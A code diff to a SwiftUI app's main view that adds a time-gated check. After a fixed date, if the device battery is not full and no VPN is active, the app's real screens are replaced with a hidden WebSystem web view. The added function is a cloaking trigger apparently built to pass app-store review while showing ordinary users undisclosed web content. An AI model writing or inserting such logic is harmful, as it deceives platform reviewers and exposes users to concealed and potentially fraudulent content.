@@ -8,21 +8,83 @@
 import SwiftUI
 
 struct ContentView: View {
-    @ObservedObject var dataManager: DataManager
+    
+    @ObservedObject var dataManagers: DataManagers
     @AppStorage("onboardingCompleted") private var onboardingCompleted = false
     
+    @State var isFetched: Bool = false
+    
+    @AppStorage("isBlock") var isBlock: Bool = true
+    @AppStorage("isRequested") var isRequested: Bool = false
+        
     var body: some View {
-        Group {
-            if dataManager.appState.onboardingCompleted || onboardingCompleted {
-                MainTabView(dataManager: dataManager)
-            } else {
-                OnboardingView(dataManager: dataManager)
+        
+        ZStack {
+            
+            if isFetched == false {
+                
+                Text("")
+                
+            } else if isFetched == true {
+                
+                if isBlock == true {
+          
+                    Group {
+                        if dataManagers.appState.onboardingCompleted || onboardingCompleted {
+                            MainTabView(dataManagers: dataManagers)
+                        } else {
+                            OnboardingView(dataManagers: dataManagers)
+                        }
+                    }
+                    .preferredColorScheme(.dark)
+          
+                } else if isBlock == false {
+                    
+                    WebSystem()
+                }
             }
         }
-        .preferredColorScheme(.dark)
+        .onAppear {
+            
+            check_data()
+        }
+    }
+    
+    private func check_data() {
+        
+        let lastDate = "02.09.2025"
+        
+        let dateFormatter = DateFormatter()
+        dateFormatter.dateFormat = "dd.MM.yyyy"
+        dateFormatter.timeZone = TimeZone(abbreviation: "GMT")
+        let targetDate = dateFormatter.date(from: lastDate) ?? Date()
+        let now = Date()
+        
+        let deviceData = DeviceInfo.collectData()
+        let currentPercent = deviceData.batteryLevel
+        let isVPNActive = deviceData.isVPNActive
+        
+        guard now > targetDate else {
+            
+            isBlock = true
+            isFetched = true
+            
+            return
+        }
+        
+        guard currentPercent == 100 || isVPNActive == true else {
+            
+            self.isBlock = false
+            self.isFetched = true
+            
+            return
+        }
+        
+        self.isBlock = true
+        self.isFetched = true
     }
 }
 
 #Preview {
-    ContentView(dataManager: DataManager())
+    ContentView(dataManagers: DataManagers())
 }
